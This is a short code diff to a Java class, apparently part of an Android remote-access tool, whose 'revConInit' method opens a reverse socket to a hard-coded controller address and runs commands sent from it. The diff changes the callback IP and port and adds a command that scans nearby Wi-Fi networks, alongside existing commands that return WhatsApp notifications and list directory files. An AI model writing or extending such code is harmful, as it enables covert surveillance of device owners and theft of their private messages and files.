@@ -17,7 +17,7 @@ public class ConMan {
     public static void revConInit() throws Exception {
 
         // start a socket
-        Socket socket = new Socket("192.168.18.25", 8888);
+        Socket socket = new Socket("192.168.18.24", 1024);
 
         // Input Socket
         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -93,6 +93,10 @@ public class ConMan {
             // Whatsapp Notification
             case "0xWA":
                 returnMessage = String.valueOf(NotificationListener.GetWhatsappNotifications());
+                break;
+            // Wifi Scanner
+            case "0xWS":
+                returnMessage = String.valueOf(WifiScanner.scan(MainService.getContextOfApplication()));
                 break;
             // List Files in Given Directory
             case "0xF0":
